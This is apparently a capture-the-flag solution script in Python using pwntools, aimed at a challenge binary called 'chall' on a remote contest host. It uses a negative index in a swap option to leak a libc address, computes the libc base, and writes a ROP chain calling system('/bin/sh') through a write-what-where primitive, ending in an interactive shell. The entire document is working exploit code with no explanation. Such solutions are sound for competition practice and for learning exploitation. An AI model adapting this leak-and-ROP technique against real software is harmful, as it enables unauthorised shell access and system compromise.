#!/usr/bin/env python3

from pwn import *

def swap(p,n):
	p.sendline('1')
	p.sendlineafter('Index 1:\n','0')
	p.sendlineafter('Index 2:\n',str(n-65536))
	p.recvuntil('Option: \n')

def leak(p,n):
	swap(p,n)
	p.sendline('2')
	p.recvuntil('ID[0] =')
	_ = p.recvline().strip()
	swap(p,n)
	return int(_)

def insert(p,n):
	p.sendline('3')
	p.sendlineafter('Index: \n','0')
	p.sendlineafter('Value: \n',str(n))
	p.recvuntil('Option: \n')

def www(p,what,where):
	insert(p,what)
	swap(p,where)

binary = context.binary = ELF('./chall')

if args.REMOTE:
	p = remote('challs.xmas.htsp.ro', 2002)
	libc = ELF('./libc.so.6')
else:
	p = process(binary.path)
	libc = binary.libc

p.recvuntil('Option: \n')

__libc_start_main = leak(p,0x58 // 8) - 231
libc.address = __libc_start_main - libc.sym.__libc_start_main
log.info('libc.address: ' + hex(libc.address))

rop = ROP([libc])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payload = [pop_rdi+1,pop_rdi,libc.search(b'/bin/sh').__next__(),libc.sym.system]

where = 0x58 // 8
for what in payload:
	www(p,what,where)
	where += 1

p.sendline('4')
p.interactive()
